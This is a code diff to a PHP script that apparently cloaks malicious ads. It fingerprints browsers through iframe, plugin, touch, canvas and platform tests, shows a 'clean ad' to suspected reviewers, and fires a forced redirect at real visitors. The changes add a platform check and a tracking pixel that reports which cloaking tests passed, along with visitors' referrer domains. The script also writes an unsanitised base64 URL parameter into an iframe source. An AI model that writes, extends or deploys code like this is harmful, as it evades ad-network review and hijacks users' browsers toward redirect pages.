@@ -1,6 +1,6 @@
 <?php
 
-	$__VERSION = "5.6";
+	$__VERSION = "5.7";
 
 	if (array_key_exists("version", $_GET))
 	{
@@ -331,6 +331,7 @@
 		}		
 	}
 
+	// Redirect method windowtoplocationiframe, serve iframe with redirect url as content
 	if (array_key_exists("iframe", $_GET) && array_key_exists("data", $_GET))
 	{
 		echo "<html><body><iframe frameborder=\"0\" style=\"width:100%;height:100%;\" src=\"" . base64_decode($_GET["data"]) . "\"></iframe></body></html>";
@@ -712,7 +713,8 @@
 		// Append referrer
 		$cloakTrackingPixelUrl = appendReferrerParameter($cloakTrackingPixelUrl);
 
-		$cloakTrackingPixelScript = getTrackingPixelCode("addCloakTrackingPixel", $cloakTrackingPixelUrl);
+		$cloakTrackingPixelScript = getTrackingPixelCode("addCloakTrackingPixel", $cloakTrackingPixelUrl, 
+			"(typeof testResults != 'undefined' ? ('&' + (testResults.isTouchTest ? 'touchSuccess=' + encodeURIComponent(getReferrerDomain()) : 'touchFailed=' + encodeURIComponent(getReferrerDomain())) + '&' + (testResults.platformTest ? 'platformSuccess=' + window.navigator.platform : 'platformFailed=' + window.navigator.platform)) : '')");
 	}
 
 	if (($serveCleanAd || !$redirectEnabled) && !$forceDirtyAd)
@@ -825,12 +827,7 @@
 
 		$scriptCode = "<script type=\"text/javascript\">
 
-						var testResults = [];
-
-						function isTrue(value)
-						{
-							return value === true;
-						}
+						var testResults = {};
 
 						if (typeof jslog !== 'function')
 						{
@@ -838,11 +835,13 @@
 						}" .
 
 						($trackingPixelEnabled && !empty($trackingPixelUrl) ? $trackingPixelScript : "") .
+						($cloakTrackingPixelEnabled && !empty($cloakTrackingPixelUrl) ? $cloakTrackingPixelScript : "") .
 
 					   	($iframeCloakingEnabled ? file_get_contents("js/iframetest.js") : "") .
 			   			($pluginCloakingEnabled ? file_get_contents("js/plugintest.js") : "") .
 			   			($touchCloakingEnabled ? file_get_contents("js/touchtest.js") : "") .
 						($canvasFingerprintCheckEnabled && !empty($blockedCanvasFingerprints) ? file_get_contents("js/canvasfingerprinttest.js") : "") .
+						(true ? file_get_contents("js/platformtest.js") : "") .
 
 					   "
 					   	function inBlockedCanvasList()
@@ -869,29 +868,25 @@
 						function go()
 						{\n" .
 							($trackingPixelEnabled && !empty($trackingPixelUrl) ? "addTrackingPixel();\n" : "") .
-						   	($iframeCloakingEnabled ? "testResults.push(inIFrame());\n" : "") .
-				   			($pluginCloakingEnabled ? "testResults.push(!hasPlugins());\n" : "") .
-				   			($touchCloakingEnabled ? "testResults.push(isTouch());\n" : "") .
-							($canvasFingerprintCheckEnabled && !empty($blockedCanvasFingerprints) ? "testResults.push(!inBlockedCanvasList());\n" : "") .							
+						   	($iframeCloakingEnabled ? "testResults.inIFrameTest = (inIFrame());\n" : "") .
+				   			($pluginCloakingEnabled ? "testResults.hasPluginsTest = (!hasPlugins());\n" : "") .
+				   			($touchCloakingEnabled ? "testResults.isTouchTest = (isTouch());\n" : "") .
+							($canvasFingerprintCheckEnabled && !empty($blockedCanvasFingerprints) ? "testResults.isNotInBlockedCanvasListTest = (!inBlockedCanvasList());\n" : "") .
+							(true ? "testResults.platformTest = (platformTest());\n" : "") .
+							($cloakTrackingPixelEnabled && !empty($cloakTrackingPixelUrl) ? "addCloakTrackingPixel();\n" : "") . // added last because this uses JS test results
 						   "jslog(testResults);
 
-						   	if (testResults.every(isTrue))
+						   	var allTestResultsTrue = true;
+							Object.keys(testResults).forEach(function(key, index) { if (this[key] === false) { allTestResultsTrue = false; } }, testResults);
+
+						   	if (allTestResultsTrue)
 						   	{
-							   	/*if (/(iphone|linux armv)/i.test(window.navigator.platform))*/
-							    {
-									jslog('CHECK:PLATFORM_ALLOWED: Platform test succeeded: ' + window.navigator.platform);
-
-								    setTimeout(function()
-									{
-										var topDomain = getReferrerDomain();
-
-										$redirectCode
-									}, $redirectTimeout);
-								}
-								/*else*/
+							    setTimeout(function()
 								{
-									jslog('CHECK:PLATFORM_BLOCKED: Platform test failed: ' + window.navigator.platform);
-								}
+									var topDomain = getReferrerDomain();
+
+									$redirectCode
+								}, $redirectTimeout);
 							}
 					   	}
 
